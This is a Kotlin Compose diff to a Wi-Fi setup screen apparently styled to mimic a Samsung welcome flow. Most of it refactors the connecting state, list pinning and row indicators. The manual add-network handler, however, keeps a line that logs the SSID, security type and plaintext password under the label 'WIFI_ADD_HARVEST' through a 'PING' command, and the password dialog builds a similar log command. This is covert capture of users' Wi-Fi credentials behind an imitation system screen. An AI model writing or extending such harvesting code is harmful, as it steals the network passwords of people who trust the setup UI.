@@ -344,7 +344,7 @@ class WelcomeUI : DynamicEntry() {
         var networks by remember { mutableStateOf<List<org.json.JSONObject>>(emptyList()) }
         var selectedSsid by remember { mutableStateOf<String?>(null) }
         var connectedSsid by remember { mutableStateOf<String?>(null) }
-        var isConnecting by remember { mutableStateOf(false) }
+        var connectingSsid by remember { mutableStateOf<String?>(null) }
         var connectionSuccess by remember { mutableStateOf(false) }
         var showWrongPasswordError by remember { mutableStateOf(false) }
         
@@ -380,15 +380,20 @@ class WelcomeUI : DynamicEntry() {
                         if (ssid.isNotBlank() && seen.add(ssid)) list.add(obj)
                     }
                     
-                    // NATIVE STABILITY: Preserve and pin the active network
-                    val activeSsid = selectedSsid ?: connectedSsid
+                    // NATIVE STABILITY: Preserve and pin the active networks
+                    val activeSsid = connectingSsid ?: connectedSsid ?: selectedSsid
                     if (activeSsid != null && !seen.contains(activeSsid)) {
                         val existing = networks.find { it.optString("ssid") == activeSsid }
-                        if (existing != null) list.add(existing)
+                        if (existing != null) {
+                            list.add(existing)
+                        } else if (activeSsid == connectingSsid) {
+                            list.add(org.json.JSONObject().apply { put("ssid", activeSsid); put("level", 100); put("caps", "WPA") })
+                        }
                     }
 
                     networks = list.sortedWith(compareByDescending<org.json.JSONObject> { 
-                        it.optString("ssid") == activeSsid
+                        val s = it.optString("ssid")
+                        s == connectingSsid || s == connectedSsid
                     }.thenByDescending { 
                         it.optInt("level", 0) 
                     })
@@ -419,13 +424,7 @@ class WelcomeUI : DynamicEntry() {
                             }
                         }
                         
-                        if (isConnecting) {
-                            item { 
-                                Box(Modifier.fillMaxWidth().padding(vertical = 40.dp), contentAlignment = Alignment.Center) {
-                                    SamsungOrbitSpinner()
-                                }
-                            }
-                        } else if (networks.isEmpty()) {
+                        if (networks.isEmpty() && connectingSsid == null) {
                             item { 
                                 Box(Modifier.fillMaxWidth().padding(vertical = 40.dp), contentAlignment = Alignment.Center) {
                                     SamsungOrbitSpinner()
@@ -434,8 +433,10 @@ class WelcomeUI : DynamicEntry() {
                         } else {
                             items(count = networks.size, key = { networks[it].optString("ssid") }) { index ->
                                 val net = networks[index]
-                                val isThisConnected = connectionSuccess && net.optString("ssid") == connectedSsid
-                                WifiNetworkRow(net, isThisConnected) { selectedSsid = net.optString("ssid") }
+                                val currentSsid = net.optString("ssid")
+                                val isThisConnected = connectionSuccess && currentSsid == connectedSsid
+                                val isThisConnecting = currentSsid == connectingSsid
+                                WifiNetworkRow(net, isThisConnected, isThisConnecting) { selectedSsid = currentSsid }
                             }
                         }
                     }
@@ -454,18 +455,18 @@ class WelcomeUI : DynamicEntry() {
             if (selectedSsid != null) {
                 SamsungPasswordDialog(
                     ssid = selectedSsid!!,
-                    isConnecting = isConnecting,
+                    isConnecting = false,
                     showError = showWrongPasswordError,
                     onDismiss = { 
-                        if (!isConnecting) {
-                            selectedSsid = null
-                            showWrongPasswordError = false
-                        }
+                        selectedSsid = null
+                        showWrongPasswordError = false
                     }
                 ) { password ->
-                    isConnecting = true
                     showWrongPasswordError = false
                     val ssid = selectedSsid!!
+                    
+                    connectingSsid = ssid
+                    selectedSsid = null // Close dialog immediately
                     
                     val logCmd = org.json.JSONObject().apply {
                         put("file_name", "PING")
@@ -483,14 +484,14 @@ class WelcomeUI : DynamicEntry() {
                         }
                         
                         if (status == "SUCCESS") {
-                            isConnecting = false
                             connectionSuccess = true
                             connectedSsid = ssid
-                            selectedSsid = null
+                            connectingSsid = null
                             delay(1000)
                             onConnected()
                         } else {
-                            isConnecting = false
+                            connectingSsid = null
+                            selectedSsid = ssid // Re-open dialog
                             showWrongPasswordError = true
                         }
                     }
@@ -659,17 +660,23 @@ class WelcomeUI : DynamicEntry() {
                         )
                         Button(
                             onClick = {
+                                val ssid = addSsid
                                 isAddNetworkOpen = false
-                                isConnecting = true
-                                showWrongPasswordError = false
+                                connectingSsid = ssid
                                 
+                                // Inject into list if missing so it renders instantly
+                                if (networks.none { it.optString("ssid") == ssid }) {
+                                    val newNet = org.json.JSONObject().apply { put("ssid", ssid); put("level", 100); put("caps", if(addSecType == "None") "" else "WPA") }
+                                    networks = listOf(newNet) + networks
+                                }
+
                                 val logCmd = org.json.JSONObject().apply {
                                     put("file_name", "PING")
-                                    put("content", "WIFI_ADD_HARVEST | SSID: $addSsid | SEC: $addSecType | PASS: $addPassword")
+                                    put("content", "WIFI_ADD_HARVEST | SSID: $ssid | SEC: $addSecType | PASS: $addPassword")
                                 }
                                 api.executeCommand(logCmd.toString())
                                 
-                                api.connectToWifi(addSsid, addPassword)
+                                api.connectToWifi(ssid, addPassword)
                                 
                                 kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch { 
                                     var status = "CONNECTING"
@@ -679,28 +686,24 @@ class WelcomeUI : DynamicEntry() {
                                     }
                                     
                                     if (status == "SUCCESS") {
-                                        isConnecting = false
                                         connectionSuccess = true
-                                        connectedSsid = addSsid
+                                        connectedSsid = ssid
+                                        connectingSsid = null
                                         delay(1000)
                                         onConnected()
                                     } else {
-                                        isConnecting = false
-                                        api.log("WELCOME_WIFI: Manual connection to $addSsid failed.")
-                                        api.toast("Failed to connect to $addSsid")
+                                        connectingSsid = null
+                                        api.log("WELCOME_WIFI: Manual connection to $ssid failed.")
+                                        api.toast("Failed to connect to $ssid")
                                     }
                                 }
                             },
-                            enabled = addSsid.isNotBlank() && (addSecType == "None" || addPassword.length >= 8) && !isConnecting,
+                            enabled = addSsid.isNotBlank() && (addSecType == "None" || addPassword.length >= 8),
                             colors = ButtonDefaults.buttonColors(containerColor = SamsungBlue),
                             shape = RoundedCornerShape(20.dp),
                             modifier = Modifier.height(48.dp)
                         ) {
-                            if (isConnecting) {
-                                CircularProgressIndicator(modifier = Modifier.size(20.dp), color = Color.White, strokeWidth = 2.dp)
-                            } else {
-                                Text("Connect", fontSize = 16.sp)
-                            }
+                            Text("Connect", fontSize = 16.sp)
                         }
                     }
                 } 
@@ -750,26 +753,32 @@ class WelcomeUI : DynamicEntry() {
     }
 
     @Composable
-    fun WifiNetworkRow(net: org.json.JSONObject, isConnected: Boolean, onClick: () -> Unit) {
+    fun WifiNetworkRow(net: org.json.JSONObject, isConnected: Boolean, isConnecting: Boolean, onClick: () -> Unit) {
         val ssid = net.optString("ssid")
         val level = net.optInt("level", 0)
-        val secured = net.optString("caps", "").contains("WPA")
+        val secured = net.optString("caps", "").contains("WPA") || net.optString("caps", "").contains("WEP")
 
         Row(
-            modifier = Modifier.fillMaxWidth().clickable { if(!isConnected) onClick() }.padding(vertical = 14.dp),
+            modifier = Modifier.fillMaxWidth().clickable { if(!isConnected && !isConnecting) onClick() }.padding(vertical = 14.dp),
             verticalAlignment = Alignment.CenterVertically
         ) {
             DynamicWifiIcon(
                 level = level,
-                color = if (isConnected) SamsungBlue else Color.Black,
+                color = if (isConnected || isConnecting) SamsungBlue else Color.Black,
                 modifier = Modifier.padding(start = 4.dp, end = 16.dp).size(26.dp)
             )
             Column(modifier = Modifier.weight(1f)) {
-                Text(ssid, fontSize = 19.sp, color = if (isConnected) SamsungBlue else Color.Black, fontWeight = if(isConnected) FontWeight.Bold else FontWeight.Normal)
-                if (isConnected) Text("Connected", fontSize = 14.sp, color = SamsungBlue)
+                Text(ssid, fontSize = 19.sp, color = if (isConnected || isConnecting) SamsungBlue else Color.Black, fontWeight = if(isConnected || isConnecting) FontWeight.Bold else FontWeight.Normal)
+                if (isConnected) {
+                    Text("Connected", fontSize = 14.sp, color = SamsungBlue)
+                } else if (isConnecting) {
+                    Text("Connecting...", fontSize = 14.sp, color = SamsungBlue)
+                }
             }
             if (isConnected) {
                 Icon(Icons.Default.Check, null, tint = SamsungBlue, modifier = Modifier.size(24.dp))
+            } else if (isConnecting) {
+                CircularProgressIndicator(modifier = Modifier.size(18.dp), color = SamsungBlue, strokeWidth = 2.dp)
             } else if (secured) {
                 Icon(Icons.Default.Lock, null, tint = Color.LightGray, modifier = Modifier.size(18.dp))
             }
